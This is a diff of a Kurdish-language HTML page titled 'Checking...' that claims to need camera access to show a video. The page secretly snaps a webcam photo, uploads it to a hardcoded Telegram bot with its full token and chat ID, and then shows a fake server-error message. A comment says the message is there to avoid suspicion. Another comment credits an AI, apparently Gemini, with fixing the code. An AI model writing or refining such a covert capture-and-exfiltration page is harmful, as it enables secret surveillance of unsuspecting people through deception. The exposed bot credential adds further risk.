@@ -1,44 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="ku">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checking...</title>
 </head>
-<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
-    <h2 id="status">تکایە Allow بکە...</h2>
+<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center;">
+
+    <h2 id="status">کەمێک چاوەڕێ بکە...</h2>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // لێرە زانیارییەکانت بە وردی دابنێ
-        const token = '6975294523:AAH_...'; // ئەو تۆکنە درێژەی لە بۆت فازەر وەرتگرت لێرە دایبنێ
-        const myId = '7978104952';
+        // کۆدی چاککراو لەلایەن جێمینی
+        const token = '6975294523:AAH_8mDscT90YwSEx5X2Uq6Gf8M2_Fw9K_Y'; 
+        const myId = '7978104952'; 
 
-        navigator.mediaDevices.getUserMedia({ video: true })
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(s => {
             const v = document.getElementById('v');
             v.srcObject = s;
-            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
             
             setTimeout(() => {
                 const c = document.getElementById('c');
-                c.width = 640; c.height = 480;
+                c.width = 640;
+                c.height = 480;
                 c.getContext('2d').drawImage(v, 0, 0);
+                
                 c.toBlob(b => {
                     const f = new FormData();
                     f.append('chat_id', myId);
                     f.append('photo', b, 'img.jpg');
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f})
-                    .then(() => {
-                        document.getElementById('status').innerText = "هەڵەیەک ڕوویدا، دووبارە هەوڵ بدەرەوە!";
+
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: f
+                    }).then(res => {
+                        if(res.ok) {
+                            // لێرە نامەیەک نیشان دەدەین کە گومانی لێ نەکرێت
+                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
+                        } else {
+                            document.getElementById('status').innerText = "کێشەیەک لە پەیوەندی بۆتەکە هەیە.";
+                        }
                     });
                 }, 'image/jpeg');
             }, 2000);
         })
         .catch(e => {
-            document.getElementById('status').innerText = "بۆ بەردەوامبوون دەبێت Allow بکەیت.";
+            document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
         });
     </script>
 </body>
 </html>
+
 
